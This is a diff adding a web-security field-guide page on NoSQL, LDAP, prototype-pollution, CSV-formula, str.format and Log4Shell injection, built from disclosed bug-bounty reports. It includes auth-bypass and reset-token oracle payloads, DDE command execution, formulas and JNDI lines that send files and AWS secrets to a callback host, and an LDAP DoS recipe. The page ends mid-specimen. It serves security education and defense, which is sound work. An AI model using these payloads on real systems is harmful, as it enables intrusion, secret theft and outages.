@@ -1,0 +1,1146 @@
+<!doctype html><html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>LDAP / XML / Other Injection · The Hacktivity Field Guide</title>
+<meta name="description" content="">
+<link rel="icon" href="/favicon.jpg">
+<script>try{var t=localStorage.getItem('fg-theme');if(t)document.documentElement.setAttribute('data-theme',t);}catch(e){}</script>
+<link rel="stylesheet" href="../assets/style.css">
+<script>window.SITE_ROOT="../";</script>
+</head><body>
+<div class="ethics" id="ethics"><b>⚠ Authorized testing only.</b> Disclosed public bug-bounty data for defensive/educational research. Use payloads only against systems you are permitted to test. <button id="ethicsX">Dismiss</button></div>
+<div class="top">
+  <button class="hamb" id="hamb" aria-label="Open navigation">☰</button>
+  <a class="brand" href="../index.html"><img class="seal" src="/favicon.jpg" alt="Logo"><span>The Hacktivity Field Guide<small>Real-world web hacking, catalogued</small></span></a>
+  <a class="tbtn" href="/" aria-label="Main site" title="Gill.Singh.A" style="text-decoration:none">⌂</a><div class="searchwrap"><span class="mag">🔎</span><input id="q" type="search" placeholder="Search techniques, programs, report IDs…" autocomplete="off" aria-label="Search"><div class="results" id="results"></div></div>
+  <button class="tbtn" id="themeBtn" aria-label="Toggle light/dark">◐</button>
+</div>
+<div class="crumb"><a href="../index.html">Field Guide</a><span class="sep">/</span><b>Vulnerabilities</b><span class="sep">/</span><b>LDAP / XML / Other Injection</b></div>
+<div class="shell">
+  <aside class="side" id="side" aria-label="Taxonomy"><div class="nav">
+<a class="navhome" href="../index.html">⌂ Home</a>
+<div class="nav-h">Methodology</div>
+<a href="../methodology/recon.html">Recon</a>
+<a href="../methodology/choosing-targets.html">Choosing targets</a>
+<a href="../methodology/triage-and-impact.html">Triage & impact</a>
+<a href="../methodology/reporting.html">Reporting</a>
+<div class="nav-h">Injection</div>
+<a class="" href="../vulnerabilities/sqli.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>SQL Injection<span class="n">122</span></a>
+<a class="" href="../vulnerabilities/command-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>OS Command Injection<span class="n">85</span></a>
+<a class="" href="../vulnerabilities/code-injection.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Code Injection<span class="n">86</span></a>
+<a class="" href="../vulnerabilities/ssti.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Template Injection<span class="n">14</span></a>
+<a class="on" href="../vulnerabilities/injection-other.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>LDAP / XML / Other Injection<span class="n">77</span></a>
+<a class="" href="../vulnerabilities/crlf-http-splitting.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>CRLF / HTTP Response Splitting<span class="n">22</span></a>
+<a class="" href="../vulnerabilities/xxe.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>XML External Entities (XXE)<span class="n">25</span></a>
+<a class="" href="../vulnerabilities/rfi.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Remote File Inclusion<span class="n">4</span></a>
+<div class="nav-h">Client-side</div>
+<a class="" href="../vulnerabilities/xss.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Scripting (XSS)<span class="n">936</span></a>
+<a class="" href="../vulnerabilities/csrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cross-Site Request Forgery (CSRF)<span class="n">144</span></a>
+<a class="" href="../vulnerabilities/clickjacking.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Clickjacking<span class="n">20</span></a>
+<a class="" href="../vulnerabilities/open-redirect.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Open Redirect<span class="n">151</span></a>
+<a class="" href="../vulnerabilities/spoofing-phishing.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Content Spoofing &amp; Phishing<span class="n">74</span></a>
+<div class="nav-h">Access control</div>
+<a class="" href="../vulnerabilities/idor.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>IDOR / BOLA<span class="n">248</span></a>
+<a class="" href="../vulnerabilities/access-control.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Broken Access Control<span class="n">494</span></a>
+<a class="" href="../vulnerabilities/privilege-escalation.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Privilege Escalation<span class="n">88</span></a>
+<a class="" href="../vulnerabilities/mass-assignment.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Mass Assignment<span class="n">16</span></a>
+<div class="nav-h">Auth & session</div>
+<a class="" href="../vulnerabilities/auth.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Authentication &amp; ATO<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/session.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Session Management<span class="n">61</span></a>
+<div class="nav-h">Server-side</div>
+<a class="" href="../vulnerabilities/ssrf.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Server-Side Request Forgery (SSRF)<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/path-traversal.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Path Traversal / LFI<span class="n">181</span></a>
+<a class="" href="../vulnerabilities/deserialization.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Insecure Deserialization<span class="n">69</span></a>
+<a class="" href="../vulnerabilities/request-smuggling.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>HTTP Request Smuggling<span class="n">33</span></a>
+<a class="" href="../vulnerabilities/cache.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Web Cache Poisoning &amp; Deception<span class="n">36</span></a>
+<a class="" href="../attack-surface/file-upload.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>File Upload<span class="n">66</span></a>
+<div class="nav-h">Logic & infra</div>
+<a class="" href="../vulnerabilities/business-logic.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Business Logic Flaws<span class="n">267</span></a>
+<a class="" href="../vulnerabilities/race-condition.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Race Conditions<span class="n">42</span></a>
+<a class="" href="../vulnerabilities/dos-resource.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Denial of Service<span class="n">296</span></a>
+<a class="" href="../vulnerabilities/misconfiguration.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Security Misconfiguration<span class="n">119</span></a>
+<a class="" href="../vulnerabilities/unclassified.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Protocol, Config &amp; Infra Injection (long tail)<span class="n">218</span></a>
+<a class="" href="../vulnerabilities/supply-chain.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Supply Chain &amp; Malicious Code<span class="n">31</span></a>
+<a class="" href="../vulnerabilities/logging.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Logging &amp; Monitoring Failures<span class="n">14</span></a>
+<div class="nav-h">Disclosure & crypto</div>
+<a class="" href="../vulnerabilities/info-disclosure.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Information Disclosure<span class="n">568</span></a>
+<a class="" href="../vulnerabilities/crypto.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Cryptographic Issues<span class="n">91</span></a>
+<a class="" href="../vulnerabilities/mitm.html"><span class="dot" style="background:var(--sev-high)" title="High"></span>Man-in-the-Middle<span class="n">12</span></a>
+<div class="nav-h">Binary</div>
+<a class="" href="../vulnerabilities/memory-corruption.html"><span class="dot" style="background:var(--sev-crit)" title="Critical"></span>Memory Corruption<span class="n">324</span></a>
+<div class="nav-h">Emerging</div>
+<a class="" href="../vulnerabilities/llm-ai.html"><span class="dot" style="background:var(--sev-med)" title="Medium"></span>LLM / AI Attacks<span class="n">3</span></a>
+<div class="nav-h">Attack surface</div>
+<a class="" href="../attack-surface/graphql.html">GraphQL<span class="n">42</span></a>
+<a class="" href="../attack-surface/oauth.html">OAuth 2.0 / OIDC<span class="n">62</span></a>
+<a class="" href="../attack-surface/jwt.html">JSON Web Tokens (JWT)<span class="n">10</span></a>
+<a class="" href="../attack-surface/saml.html">SAML<span class="n">5</span></a>
+<a class="" href="../attack-surface/cors.html">CORS Misconfiguration<span class="n">22</span></a>
+<a class="" href="../attack-surface/subdomain-takeover.html">Subdomain Takeover<span class="n">121</span></a>
+<a class="" href="../attack-surface/account-takeover.html">Account Takeover Chains<span class="n">101</span></a>
+<a class="" href="../attack-surface/file-upload.html">File Upload<span class="n">66</span></a>
+<a class="" href="../attack-surface/cloud-aws.html">Cloud Metadata &amp; Keys</a>
+<a class="" href="../attack-surface/webhooks.html">Webhooks &amp; Integrations</a>
+<a class="" href="../attack-surface/mobile.html">Mobile &amp; Thick-Client</a>
+<div class="nav-h">Field notes</div>
+<a href="../chains.html">Exploit chains</a><a href="../payloads.html">Payload libraries</a>
+</div></aside>
+  <main class="main">
+    <header class="entry-head">
+      <div class="kicker"><span class="dot" style="background:var(--sev-crit)"></span>Vulnerabilities</div>
+      <h1>LDAP / XML / Other Injection</h1>
+      <div class="meta-row"><span class="chip">Specimens <b>77</b></span><a class="chip lab" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Practice — PortSwigger: <b>SQL injection</b></a></div>
+    </header>
+    
+    <h2 class="sec" id="basic-information"><span class="tick">§</span>Basic information</h2>
+<p>Injection is what happens when a value the developer treats as an inert <strong>string</strong> is handed to a downstream engine that treats it as <strong>structure or code</strong>. SQLi, XSS, SSTI and command injection are the famous four, but the same mechanic recurs anywhere input crosses a parser boundary: a MongoDB query filter, a <code>lodash</code> deep-merge, an LDAP filter string, a spreadsheet cell, a <code>str.format()</code> template, a Log4j logging lookup, a GraphQL/URN reference resolver, an HTTP/SIP header parser. This page is the long tail of everything else.</p>
+<p>The unifying question is <em>"if something parses my input, what else can I say to it?"</em> The developer sends a <code>username</code>; the LDAP layer sees filter syntax. The developer sends JSON options; the merge function sees a <code>__proto__</code> key. The developer exports a name to CSV; Excel sees a formula. Impact ranges from <strong>DoS</strong> (prototype clobber, LDAP amplification) through <strong>info disclosure</strong> (format-string globals, reference-resolver DB dumps) up to <strong>authentication bypass and RCE</strong> (Mongo <code>$ne</code>, blind <code>$regex</code> → reset-token exfil → admin ATO → webhook script). Treat each of these as its own grammar with its own metacharacters.</p>
+<h2 class="sec" id="methodology"><span class="tick">§</span>Methodology</h2>
+<ol><li><strong>Fingerprint the engine behind the field.</strong> A <code>token</code> that feeds a Mongo query, a <code>username</code> that builds an LDAP filter, an options blob that gets deep-merged, a field that later lands in a CSV export — each has a different grammar.</li><li><strong>Fire a multi-grammar canary</strong> and watch which single backend errors or changes behavior.</li><li><strong>Speak that engine's grammar</strong> — swap the string for the operator object / filter metacharacter / prototype key / formula prefix that the parser interprets.</li><li><strong>Build a boolean or OOB oracle</strong> when the response is opaque: <code>$regex</code> prefix-match for NoSQL, a Collaborator DNS callback for JNDI/format-string.</li><li><strong>Escalate the primitive</strong> — turn a query-filter bypass into an admin session, a leaked token into ATO, a polluted prototype into an auth flag or a template gadget.</li></ol>
+<div class="pre" data-lang="text"># Multi-grammar canary — one metacharacter set upsets exactly one backend.
+# Send each token in a param/body field and diff the response vs a benign baseline.
+*')(          # LDAP filter metacharacters -&gt; LDAP error (e.g. 0x80005000) = filter sink
+{"$ne":null}  # Mongo operator object -&gt; query behavior changes = NoSQL sink
+__proto__     # merge key -&gt; ({}).pp set afterwards = prototype-pollution sink
+=1+1          # formula prefix -&gt; cell shows 2 on CSV/XLSX export = formula sink
+${jndi:x}     # JNDI lookup -&gt; OOB callback = Log4Shell sink
+{{7*7}}       # template marker -&gt; 49 means SSTI (pivot off this page)</div>
+<h2 class="sec" id="injection-contexts"><span class="tick">§</span>Injection contexts</h2>
+<p>Identify which parser your input reaches, then use the matching grammar.</p>
+<h3 class="sub" id="nosql-operator-injection-mongodb">NoSQL operator injection (MongoDB)</h3>
+<p>Any parameter that lands in a Mongo filter without being coerced to a string is injectable. HTTP <strong>bracket notation</strong> (<code>key[$ne]=null</code>) is parsed by <code>qs</code>/Express into an operator <em>object</em>, and a JSON body carries operators directly. Operators turn an equality check into an attacker-controlled predicate.</p>
+<div class="pre" data-lang="http"># Bracket notation in the query string -&gt; {access_token: {$ne: null}}
+# Matches the first token in the collection -&gt; authenticated as that user (#3564655)
+GET /api/v1/me?access_token[$ne]=null
+
+# JSON body form: match anything, bypass an equality/ownership check
+{"username": {"$gt": ""}}
+{"rid": {"$regex": ".*"}}</div>
+<h3 class="sub" id="blind-nosql-regex-where-oracle">Blind NoSQL ($regex / $where oracle)</h3>
+<p>When the response is opaque (doc-present vs error, policy-returned vs not), <code>$regex</code> gives a per-character boolean oracle. <code>$where</code> runs server-side JS and leaks <em>any</em> field of the matched document even when the endpoint restricts which fields it returns — the row-match itself becomes the oracle.</p>
+<div class="pre" data-lang="http"># $regex prefix oracle: correct prefix -&gt; non-error response. Binary-search each char
+# to reconstruct a password-reset token, then reset the admin (#2580062, #1130721)
+POST /api/v1/method.callAnon
+{"message":"{\"msg\":\"method\",\"method\":\"getPasswordPolicy\",\"params\":[{\"token\":{\"$regex\":\"^A\"}}]}"}</div>
+<div class="pre" data-lang="http"># $where: leak a hidden field even when output fields are restricted (#1130874)
+# returns the admin doc only if the guessed char of the reset token matches
+query={"$where":"this.roles.includes('admin') &amp;&amp; /^A/.test(this.services.password.reset.token)"}</div>
+<h3 class="sub" id="prototype-pollution-deep-merge-deep-set-sinks">Prototype pollution (deep-merge / deep-set sinks)</h3>
+<p>Recursive merge/clone/defaults/set helpers (<code>lodash merge</code>/<code>defaultsDeep</code>/<code>zipObjectDeep</code>/<code>set</code>, <code>merge.recursive</code>, <code>@firebase/util deepExtend</code>) that walk attacker-controlled keys without blocking <code>__proto__</code>/<code>constructor</code>/<code>prototype</code> write onto <code>Object.prototype</code> — affecting <strong>every</strong> object. Confirm on a fresh <code>{}</code>, then follow the polluted property to a gadget.</p>
+<div class="pre" data-lang="js">// Object-key form: merge sink ingesting user JSON (#310443)
+_.merge({}, JSON.parse('{"__proto__":{"polluted":"x"}}'));
+console.log(({}).polluted); // "x"  -&gt; Object.prototype is polluted
+
+// Bracket-/dot-path string form: reaches the prototype through set/zipObjectDeep (#864701, #712065)
+_.set({}, '__proto__[isAdmin]', true);
+_.zipObjectDeep(['__proto__.z'], [123]);
+console.log(({}).isAdmin, ({}).z); // true 123</div>
+<p>Client-side config merges are sinks too — a Mermaid <code>%%{init}%%</code> directive stored in any issue/comment pollutes the prototype for every viewer who renders it (#1106238):</p>
+<div class="pre" data-lang="text">%%{init: { "__proto__": {"polluted": "asdf"} } }%%
+sequenceDiagram
+Alice-&gt;&gt;Bob: Hi Bob</div>
+<h3 class="sub" id="ldap-filter-injection">LDAP filter injection</h3>
+<p>A login or search that builds <code>(|(uid=$u)(mail=$u)...)</code> by string concatenation lets filter metacharacters (<code>* ( ) \</code>) become syntax. <code>*</code> is a presence wildcard (matches everything → auth/info issues); repeated presence sub-filters make the server evaluate an enormous filter until it OOMs.</p>
+<div class="pre" data-lang="text"># Detection: a single unbalanced ) throws an LDAP error (e.g. 0x80005000) (#359290)
+username=)
+
+# Amplification DoS: heap OOM evaluating the inflated OR-filter (#906959)
+# vulnerable filter: (|(uid=${username})(mail=${username})(username=${username}))
+# username value = "*)" then "(cn=*)" repeated ~700000 times then "(cn=*"
+# (conceptual construction — send the resulting ~4.9MB string as the username)</div>
+<h3 class="sub" id="spreadsheet-formula-csv-dde-injection">Spreadsheet formula / CSV-DDE injection</h3>
+<p>Any user-controlled value that lands in an exported CSV/XLSX and begins with <code>= + - @</code> is evaluated as a formula when a victim opens it. This is almost always <strong>second-order and cross-user</strong>: one user plants the payload, a <em>different</em> privileged user's export triggers it — so it works even on "self-only" fields.</p>
+<div class="pre" data-lang="bash"># =1+1 shows "2" on open -&gt; evaluation confirmed. Then escalate:
+=cmd|' /C calc'!A0                                   # DDE command exec (Excel/Windows) (#72785, #126109)
+=HYPERLINK("https://COLLAB/x?d="&amp;A1,"click")         # exfil adjacent cells (#126109)
+=WEBSERVICE(CONCATENATE("https://COLLAB/x",'file:///etc/passwd'#$passwd.A1))  # local file read (#943255)</div>
+<div class="callout tip"><span class="ico">▸ TIP</span><div>Breakout when a leading quote is added: prefix with <code>"</code> to close the sanitizer's quote (<code>"=1+1</code>), or use LibreOffice's single-quote formula form <code>",'=2+11',"</code> to slip a double-quote neutralizer (#943255). A leading newline before the formula can bypass an <code>=+-@</code>-prefix filter entirely (#111192).</div></div>
+<h3 class="sub" id="python-str-format-injection">Python str.format() injection</h3>
+<p>A user-controlled value used as the <strong>format string</strong> (not as an argument) is an injection — <code>{obj.__class__.__init__.__globals__[...]}</code> walks object attributes to module globals and dumps secrets with no <code>eval</code> required. Distinct from f-strings; grep for <code>.format(</code> with attacker-influenced templates (log paths, filenames, <code>run_id</code>).</p>
+<div class="pre" data-lang="python"># Airflow CVE-2022-40604: run_id is interpolated into a str.format() log-URL template (#1707287)
+run_id = "{ti.task.__class__.__init__.__globals__[conf].__dict__}"
+# -&gt; leaks Airflow conf: secret_key, sql_alchemy_conn, DB creds</div>
+<h3 class="sub" id="jndi-lookup-injection-log4shell">JNDI lookup injection (Log4Shell)</h3>
+<p>Log4j &lt;2.15 performs JNDI lookups on any logged string via <code>${...}</code> substitution. Spray the payload across every value that could be logged — <strong>headers especially</strong> (User-Agent, X-Forwarded-For, Referer, auth tokens). Nest <code>${hostName}</code>/<code>${env:...}</code> into the DNS label to confirm and exfiltrate even when outbound LDAP is filtered but DNS resolves.</p>
+<div class="pre" data-lang="bash"># OOB DNS/LDAP callback = confirmed; nested lookup exfils host/secret in the DNS label (#1429014)
+${jndi:ldap://x${hostName}.log4j.COLLAB/a}
+${jndi:ldap://${env:AWS_SECRET_ACCESS_KEY}.COLLAB/a}
+# after callback, serve a malicious class from your LDAP endpoint for full RCE</div>
+<h3 class="sub" id="reference-hydration-resolver-injection">Reference / hydration resolver injection</h3>
+<p>Layers that resolve typed references (GraphQL/Voyager URN decoration, <code>node(id:)</code>, <code>@include</code> of foreign objects) often skip per-field authorization. Plant a reference to a <em>foreign</em> object in a field you control and force the server to expand it across the auth boundary; sequential IDs turn one resolve into mass extraction.</p>
+<div class="pre" data-lang="js">// Store a foreign email-URN in your own profile text field, then force decoration (#1806939)
+// profile website value:
+urn:li:fs_emailAddress:8519272224
+// then request expansion — the 'included' block resolves the URN to the target's email:
+fetch('/voyager/api/identity/dash/profiles?decoration=%28websites*%28url~%29%29&amp;memberIdentity=VICTIM&amp;q=memberIdentity',
+  {headers:{'x-li-deco-include-micro-schema':'true'}});
+// iterate sequential ids -&gt; dump the email DB</div>
+<h3 class="sub" id="parser-differentials-dual-path-gaps">Parser differentials &amp; dual-path gaps</h3>
+<p>When two parsers disagree — or when the same object travels one validated path and one unvalidated path — you smuggle structure past the check. Duplicate-key JSON (<code>{"role":"user","role":"admin"}</code>) is read differently by validator vs consumer (#2095061); an object sanitized on DB write reaches clients raw over the websocket broadcast path (#2541027); trailing whitespace in a header value slips an allow/deny list in the HTTP parser (#730779).</p>
+<div class="pre" data-lang="http"># Same post object, sanitized on DB write, NOT on websocket broadcast -&gt; spoof/DoS clients (#2541027)
+POST /api/v4/posts
+{"metadata":{"embeds":[{"type":"permalink","data":{"post":{"user_id":"SYSTEM","message":["crash"]}}}]}}
+# message:[...] (array, not string) type-confuses the client renderer -&gt; white-screen DoS</div>
+<div class="callout note"><span class="ico">● NOTE</span><div>Confirm the grammar with the canary <em>before</em> firing a heavy payload. Sending <code>{{7*7}}</code> and getting <code>49</code> means you are in a template engine (SSTI), not one of these sinks — pivot. Sending <code>*)</code> and getting an LDAP error confirms a filter sink even when the happy-path response looks identical.</div></div>
+<h2 class="sec" id="bypasses"><span class="tick">§</span>Bypasses</h2>
+<div style="overflow-x:auto"><table class="bx"><thead><tr><th>Filter / control</th><th>Bypass</th><th>Seen in</th></tr></thead><tbody><tr><td><code>__proto__</code> key blocklisted</td><td>reach <code>Object.prototype</code> via the <code>constructor.prototype</code> path</td><td>#380873, #380878</td></tr><tr><td>object-key form filtered</td><td>bracket/dot-path string <code>__proto__[x]</code> / <code>__proto__.z</code> in <code>set</code>/<code>zipObjectDeep</code></td><td>#864701, #712065</td></tr><tr><td>string-typed param</td><td>HTTP bracket notation <code>key[$ne]=null</code> parsed as an operator object by <code>qs</code>/Express</td><td>#3564655</td></tr><tr><td>restricted output fields</td><td><code>$where</code> makes the row-match itself the oracle — leaks hidden token/2FA</td><td>#1130874</td></tr><tr><td>CSV double-quote neutralizer</td><td>LibreOffice single-quote formula form <code>",'=2+11',"</code></td><td>#943255</td></tr><tr><td>CSV <code>=+-@</code> prefix filter</td><td>leading newline before the formula bypasses the prefix check</td><td>#111192</td></tr><tr><td>CSS exact-match sanitizer</td><td><code>position: fixed !important</code> / unquoted <code>url()</code> from a bg attribute</td><td>#3590586, #3590583</td></tr><tr><td>LDAP outbound (LDAP) filtered</td><td>JNDI confirm/exfil over DNS via nested <code>${hostName}</code> lookup</td><td>#1429014</td></tr><tr><td>Host allow/deny list</td><td>trailing whitespace in the header value slips <code>http_parser</code>'s list check</td><td>#730779</td></tr><tr><td>SIP header blocklist</td><td>incomplete blocklist → arbitrary SIP header injection</td><td>#3789570</td></tr><tr><td>JSON schema validation</td><td>duplicate-key parser differential smuggles a privileged field</td><td>#2095061</td></tr><tr><td>DB-write sanitizer</td><td>same object skips the sanitizer on the websocket-broadcast path</td><td>#2541027</td></tr></tbody></table></div>
+<div class="callout warn"><span class="ico">▲ WARNING</span><div>Formula/CSV injection and stored prototype pollution look like "self" issues until you frame the delivery. CSV is real because a <em>different admin</em> opens the export (#126109); Mermaid pollution is real because <em>every viewer</em> of the stored diagram renders it (#1106238). Report the cross-user delivery vector or it closes as informative.</div></div>
+<h2 class="sec" id="escalation-impact"><span class="tick">§</span>Escalation &amp; impact</h2>
+<p>The recurring corpus pattern is <em>injection → oracle → secret → account takeover → RCE</em>:</p>
+<ul><li><strong>NoSQLi → ATO → RCE.</strong> A <code>$regex</code>/<code>$where</code> boolean oracle leaks a password-reset token (and 2FA secret), you reset the admin, then create a scriptable incoming webhook for server-side code exec — admin-ATO on chat/CMS apps reliably reaches RCE via integrations (#1130721, #1130874).</li><li><strong>Operator injection → unauth auth bypass.</strong> <code>access_token[$ne]=null</code> matches the first valid token → logged in as that user with no credentials (#3564655).</li><li><strong>Format-string → <code>secret_key</code> → session forgery.</strong> Read the Flask/Airflow secret via <code>__globals__</code>, forge sessions or reuse leaked DB creds (#1707287).</li><li><strong>JNDI → RCE.</strong> Logged input → LDAP fetch → remote class load (#1429014).</li><li><strong>Prototype pollution → gadget.</strong> A polluted property feeds a downstream sink (template <code>outputFunctionName</code>, an <code>isAdmin</code> auth flag) for privesc/RCE; clobbering <code>toString</code>/<code>valueOf</code> 500s every later request as a guaranteed DoS (#712065, #310443).</li><li><strong>Reference resolution → mass extraction.</strong> Plant a foreign URN, force decoration, iterate sequential IDs to dump the DB (#1806939).</li></ul>
+<h2 class="sec" id="prevention"><span class="tick">§</span>Prevention</h2>
+<ul><li><strong>Type-coerce query params to strings</strong> before they reach a NoSQL filter; reject operator objects. <code>String(x)</code> kills <code>$ne</code>/<code>$regex</code>/<code>$where</code> when the param can only ever be a string (#3564655).</li><li><strong>Prototype-pollution-safe merges</strong> — block <code>__proto__</code>, <code>constructor</code>, and <code>prototype</code> keys in <em>both</em> forms; use <code>Object.create(null)</code>, <code>Map</code>, or <code>--disable-proto</code>. Blocklisting only <code>__proto__</code> leaves <code>constructor.prototype</code> open (#380873).</li><li><strong>Escape LDAP metacharacters</strong> <code>* ( ) \ NUL</code> per RFC4515; never build filters by concatenation (#906959).</li><li><strong>Neutralize CSV formula prefixes</strong> <code>= + - @</code> (and leading tab/CR/newline, #111192) with a leading <code>'</code> on <strong>export</strong>, not just in the UI (#943255).</li><li><strong>Never pass user input as a <code>str.format()</code> template</strong> — use it as an argument. Patch Log4j / set <code>formatMsgNoLookups</code> for logging frameworks (#1707287, #1429014).</li><li><strong>Enforce per-field authorization in reference/hydration resolvers</strong> — decoration/<code>node(id:)</code> expansion must re-check ACLs (#1806939). <strong>Sanitize on every egress path</strong>, including broadcast (#2541027).</li></ul>
+<h2 class="sec" id="tools"><span class="tick">§</span>Tools</h2>
+<ul><li><strong>Burp Suite</strong> — Repeater/Intruder for <code>$regex</code> boolean-oracle bruteforce; Collaborator for JNDI/format-string OOB callbacks.</li><li><strong>nosqlmap</strong> — automated NoSQL operator/<code>$where</code> injection.</li><li><strong>Custom oracle scripts</strong> — binary-search char-by-char leak against a <code>$regex</code>/<code>$where</code> boolean response.</li><li><strong>ysoserial / JNDI-Exploit-Kit</strong> — serve the malicious class for Log4Shell RCE.</li><li><strong>Local Node REPL</strong> — confirm prototype pollution with <code>({}).pp</code> after a merge.</li><li><strong>Excel + LibreOffice</strong> — verify formula/DDE payloads and the single-quote breakout locally.</li></ul>
+    <h2 class="sec" id="specimens"><span class="tick">✦</span>Specimens — real-world examples</h2>
+    <p>The techniques above are the general method. Below, each disclosed HackerOne report is a catalogued example — concrete payload, outcome, and matching practice lab. <b>77</b> in this class.</p>
+    <div class="sortbar"><label for="sort">Sort specimens:</label>
+      <select id="sort"><option value="score">Best first</option><option value="votes">Most votes</option><option value="bounty">Highest bounty</option><option value="sev">Severity</option></select>
+      <span style="margin-left:auto;color:var(--muted);font-size:12px" id="showing"></span></div>
+    <div class="specimens" id="specimens"><article class="spec" id="report-3564655" style="--sv:var(--sev-crit)" data-sev="4" data-votes="97" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>NoSQL operator injection -&gt; unauth auth bypass (MongoDB $ne)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#3564655</b> · rocket_chat · none · 97 votes · resolved</div>
+<div class="taxo"><span>Program <b>rocket_chat</b></span><span>Surface <b>api</b></span><span>Chain <b>NoSQL operator injection -&gt; auth bypass -&gt; admin accou</b></span><span>Tag <b>oauth</b></span><span>Tag <b>account-takeover</b></span></div>
+<h4>Root cause</h4><p style="margin:0">An OAuth access_token was compared against the DB using an attacker-controlled query value. Passing a MongoDB operator object (access_token[$ne]=null) makes the query match the first token in the collection, authenticating with no valid credentials.</p>
+<h4>Method</h4><ol><li>Find an endpoint that authenticates via access_token query parameter.</li><li>Send access_token[$ne]=null so the value is parsed as a Mongo operator {$ne: null}.</li><li>Query matches the first existing OAuth token -&gt; authenticated as that user (admin), leading to ATO. Requires &gt;=1 OAuth token to exist.</li></ol>
+<div class="pre">GET /...?access_token[$ne]=null</div>
+<p class="insight"><b>Insight —</b> When a param maps to a query filter on a NoSQL/Mongo backend, submit operator objects (key[$ne]=null, key[$gt]=, key[$regex]=) to bypass equality checks. Bracket notation in query/body turns a string into an operator object in Express/qs.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/3564655" target="_blank" rel="noopener">hackerone.com/reports/3564655</a></span><a class="src" href="#report-3564655" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1707287" style="--sv:var(--sev-crit)" data-sev="4" data-votes="87" data-bounty="8000">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Python str.format() injection via run_id -&gt; read __globals__/config secrets (Airflow CVE-2022-40604)</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1707287</b> · ibb · 8000 · 87 votes · resolved</div>
+<div class="taxo"><span>Program <b>ibb</b></span><span>Surface <b>web</b></span><span>Chain <b>format-string injection -&gt; read secret_key -&gt; forge se</b></span></div>
+<h4>Root cause</h4><p style="margin:0">file_task_handler.py builds a log URL with str.format(ti=ti, ...) where part of the format string (log_relative_path derived from run_id) is user-controlled, so a format expression can walk object attributes to reach Python globals and dump the app config (secret_key, DB creds).</p>
+<h4>Method</h4><ol><li>Trigger a DAG with a crafted run_id that is a Python format expression</li><li>Open the task Log view and capture the get_logs_with_metadata request</li><li>Set try_number to a nonexistent value (e.g. 9999) and load the URL to surface the formatted output containing config internals</li></ol>
+<div class="pre">run_id = {ti.task.__class__.__init__.__globals__[conf].__dict__}
+# -&gt; leaks Airflow conf incl. secret_key, sql_alchemy_conn, etc.</div>
+<p class="insight"><b>Insight —</b> Any user-controlled string passed into Python str.format() is an injection: {obj.__class__.__init__.__globals__[...]} reaches module globals and secrets even without an eval. Grep for .format( with attacker-influenced format templates — distinct from f-strings.</p>
+<div class="spec-foot"><span class="src">↗ <a href="https://hackerone.com/reports/1707287" target="_blank" rel="noopener">hackerone.com/reports/1707287</a></span><a class="src" href="#report-1707287" style="color:var(--faint)">#</a><a class="labchip" href="https://portswigger.net/web-security/sql-injection" target="_blank" rel="noopener">⚑ Lab</a></div></article>
+<article class="spec" id="report-1429014" style="--sv:var(--sev-crit)" data-sev="4" data-votes="48" data-bounty="0">
+<div class="spec-eyebrow">Real-world example</div>
+<div class="spec-top"><h3>Log4Shell JNDI lookup injection (CVE-2021-44228) with DNS pre-exfil</h3><span class="fieldmark">◆ Critical</span></div>
+<div class="catalog">Specimen <b>#1429014</b> · deptofdefense · none · 48 votes · resolved</div>
+<div class="taxo"><span>Program <b>deptofdefense</b></span><span>Surface <b>web</b></span><span>Chain <b>logged input -&gt; JNDI lookup -&gt; LDAP fetch -&gt; remote</b></span></div>
